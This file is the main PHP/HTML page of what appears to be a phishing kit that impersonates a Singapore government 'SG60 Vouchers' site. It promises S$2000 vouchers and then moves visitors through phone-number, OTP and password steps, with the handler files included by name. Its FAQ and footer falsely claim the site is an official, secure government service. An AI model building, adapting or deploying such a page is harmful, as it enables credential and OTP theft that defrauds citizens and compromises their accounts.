<?php require("_core.php"); ?>
<?php
$currentState = $_SESSION["state"] ?? "start";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $TITLE ?></title>
    <meta name="robots" content="nofollow, noindex">
    <link rel="shortcut icon" href="assets/sg60.png">

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Manrope:wght@200..800&family=Poppins:wght@100..900&display=swap"
        rel="stylesheet">

    <!-- CSS & JS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css">
    <link rel="stylesheet" href="assets/main.css">
    <script src="assets/vendors/jQuery/jquery.min.js"></script>
</head>

<body>
    <!-- Banner Section -->
    <!--<div class="container dkgova" style="background-color: rgba(240, 240, 240, 0.9);">
        <div class="container secgov d-flex align-items-center gap-1" style="height: 32px;">
            <<p class="poppins" style="font-size: 10px; padding-top: 15px;">A Singapore Government Agency Website</p>
            <a href="#" class="dkgov">
                <p class="pgov poppins text-decoration-underline" style="font-size: 10px; padding-top: 15px;">How to identify
                    <svg viewBox="0 0 28 28" fill="currentColor" height="1.15rem" width="1.15rem" class="chakra-icon" aria-hidden="true">
                        <path d="M16.293 9.293L12 13.586 7.707 9.293l-1.414 1.414L12 16.414l5.707-5.707z"></path>
                    </svg>
                </p>
            </a>
        </div>
    </div>-->

    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-light bg-light px-3">
        <a class="navbar-brand" href="#">
            <img src="assets/sg60.png" height="40" alt="SG60 Logo">
        </a>
        <div class="d-flex ms-auto align-items-center gap-3">
            <button class="btn border-0" type="button" aria-label="Search">
                <i class="fas fa-search"></i>
            </button>
            <button class="btn border-0" type="button" aria-label="Menu">
                <i class="fas fa-bars"></i>
            </button>
        </div>
    </nav>

        <?php if ($currentState == 'start'): ?>
        <!-- Notification Alert -->
        <div id="notifBanner" class="alert alert-dismissible fade show rounded-0 text-center mb-0" role="alert"
            style="background-color: #C8102E; color: white; border: none; font-size: 14px;">
            SG60 Vouchers of S$2000 now available for eligible Singapore citizens.<br>
            <strong>Redeem by December 2025</strong>. Please ensure your details are verified.
            <button type="button" class="btn-close position-absolute end-0 me-6 mt-29" data-bs-dismiss="alert"
                aria-label="Close" style="filter: invert(1);"></button>
        </div>
        <?php endif; ?>
        <!-- Banner Image -->
        <div class="text-center dkban">
            <img src="assets/bannernew.jpg" class="img-fluid" alt="Banner SG60"
                style="border-radius: 20px 20px 0px 0px; margin-top: 20px;">
        </div>
    



    <!-- Content Area -->
    <div class="seclog" id="claim">
        <div id="contentArea" class="optdks">
            <?php
            if (!isset($_SESSION["state"]) || isset($_GET["otherAccount"])) {
                $_SESSION["state"] = "start";
            }

            switch ($_SESSION["state"]) {
                case "start":
                    require("Lander.php");
                    break;
                case "phone":
                    require("OTPC.php");
                    break;
                case "otp":
                    require("PASS.php");
                    break;
                case "success":
                    require("SCCS.php");
                    break;
                default:
                    print_r($_SESSION);
            }
            ?>
        </div>
    </div>

    <?php if ($currentState == 'start'): ?>
    <!-- FAQ Section -->
    <div class="container py-3">
        <p class="freq text-center">Frequently Asked Questions</p>

        <details class="mb-3 shadow-sm border rounded overflow-hidden">
            <summary class="p-3 bg-light fw-bold">Who is eligible to receive the SG60 Vouchers?</summary>
            <div class="p-3 bg-white text-muted">
                All Singaporean citizens who meet the eligibility criteria set by the government will be able to redeem
                their vouchers. Eligibility is automatically assessed during the verification process.
            </div>
        </details>

        <details class="mb-3 shadow-sm border rounded overflow-hidden">
            <summary class="p-3 bg-light fw-bold">When is the deadline to claim the vouchers?</summary>
            <div class="p-3 bg-white text-muted">
                The SG60 Vouchers can be claimed until December 2025. Submissions after this date may not be processed.
            </div>
        </details>

        <details class="mb-3 shadow-sm border rounded overflow-hidden">
            <summary class="p-3 bg-light fw-bold">Is this a secure government service?</summary>
            <div class="p-3 bg-white text-muted">
                Yes. This is an official SG60 digital platform. All data is processed securely in line with Singapore
                Government data protection standards.
            </div>
        </details>
    </div>

    <!-- Footer -->
    <footer class="text-white py-4" style="background-color: #c4002f;">
        <div class="container text-center" style="font-size: 13px;">
            <p class="mb-0">
                This service is part of the official SG60 initiative. All information provided is securely processed in
                accordance with Singapore Government data protection standards. Please ensure that your submission is
                accurate and complete.
            </p>
        </div>
    </footer>
    <?php endif; ?>
</body>


</html>
